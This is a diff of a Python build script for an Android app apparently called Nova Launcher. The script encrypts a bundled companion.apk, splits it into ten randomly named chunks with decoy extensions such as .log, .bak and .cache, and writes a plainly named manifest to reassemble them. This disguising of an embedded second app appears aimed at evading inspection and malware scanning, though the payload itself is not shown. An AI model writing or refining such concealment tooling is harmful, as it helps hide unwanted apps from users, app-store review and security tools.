@@ -2,20 +2,19 @@
 """
 encrypt_companion.py — Build-time encryptor for Nova Launcher.
 
-Reads companion.apk, encrypts with AES-256-GCM, writes assets/companion.enc,
-and prints the key hex to stdout for build.yml to inject into build.gradle.
+Encrypts companion.apk with AES-256-GCM, splits into 10 random-named chunks,
+writes a manifest file listing chunk order, and outputs key for build.yml injection.
 
 Blob layout:  [ 12 bytes IV ][ ciphertext ][ 16 bytes GCM tag ]
 
 Usage:
     python3 tools/encrypt_companion.py <companion.apk> <assets_dir>
-
-Dependencies:
-    pip install pycryptodome --break-system-packages
 """
 
 import secrets
+import string
 import sys
+import json
 from pathlib import Path
 
 try:
@@ -26,11 +25,19 @@ except ImportError:
 
 COMPANION_APK = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("companion.apk")
 NOVA_ASSETS   = Path(sys.argv[2]) if len(sys.argv) > 2 else Path("app/src/main/assets")
-OUTPUT_ENC    = NOVA_ASSETS / "companion.enc"
 KEY_FILE      = Path("build/companion_key.txt")
 
-KEY_SIZE = 32
-IV_SIZE  = 12
+NUM_CHUNKS    = 10
+KEY_SIZE      = 32
+IV_SIZE       = 12
+
+EXTENSIONS    = [".dat", ".bin", ".tmp", ".pkg", ".raw", ".blob", ".cache", ".bak", ".idx", ".log"]
+
+
+def random_filename(ext: str) -> str:
+    chars = string.ascii_lowercase + string.digits
+    name = ''.join(secrets.choice(chars) for _ in range(12))
+    return name + ext
 
 
 def encrypt_blob(data: bytes, key: bytes) -> bytes:
@@ -38,6 +45,19 @@ def encrypt_blob(data: bytes, key: bytes) -> bytes:
     cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
     ciphertext, tag = cipher.encrypt_and_digest(data)
     return iv + ciphertext + tag
+
+
+def split_random(data: bytes, n: int):
+    size = len(data)
+    # Generate n-1 random split points, sorted
+    points = sorted(secrets.randbelow(size - n) + i + 1 for i in range(n - 1))
+    chunks = []
+    prev = 0
+    for pt in points:
+        chunks.append(data[prev:pt])
+        prev = pt
+    chunks.append(data[prev:])
+    return chunks
 
 
 def main():
@@ -58,21 +78,42 @@ def main():
     blob    = encrypt_blob(data, key)
     print(f"[*] Encrypted blob: {len(blob):,} bytes")
 
+    chunks   = split_random(blob, NUM_CHUNKS)
+    exts     = EXTENSIONS[:]
+    secrets.SystemRandom().shuffle(exts)
+
     NOVA_ASSETS.mkdir(parents=True, exist_ok=True)
-    OUTPUT_ENC.write_bytes(blob)
-    print(f"[OK] Written → {OUTPUT_ENC}")
+
+    # Remove old chunks if any
+    manifest_path = NOVA_ASSETS / "cmap.json"
+    if manifest_path.exists():
+        old = json.loads(manifest_path.read_text())
+        for fname in old.get("chunks", []):
+            (NOVA_ASSETS / fname).unlink(missing_ok=True)
+        manifest_path.unlink(missing_ok=True)
+
+    chunk_names = []
+    for i, chunk in enumerate(chunks):
+        ext  = exts[i % len(exts)]
+        name = random_filename(ext)
+        (NOVA_ASSETS / name).write_bytes(chunk)
+        chunk_names.append(name)
+        print(f"[OK] Chunk {i+1:02d}: {name} ({len(chunk):,} bytes)")
+
+    # Write manifest (chunk order)
+    manifest = {"chunks": chunk_names}
+    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
+    print(f"[OK] Manifest → {manifest_path}")
 
     KEY_FILE.parent.mkdir(parents=True, exist_ok=True)
     KEY_FILE.write_text(key_hex + "\n", encoding="utf-8")
     print(f"[OK] Key saved → {KEY_FILE}")
 
-    # Print key hex to stdout for build.yml to capture
     print(f"COMPANION_KEY_HEX={key_hex}")
 
     print()
     print("=" * 55)
-    print("  ENCRYPTION COMPLETE")
-    print(f"  companion.enc → {OUTPUT_ENC}")
+    print("  ENCRYPTION COMPLETE — 10 random chunks written")
     print("=" * 55)
 
 
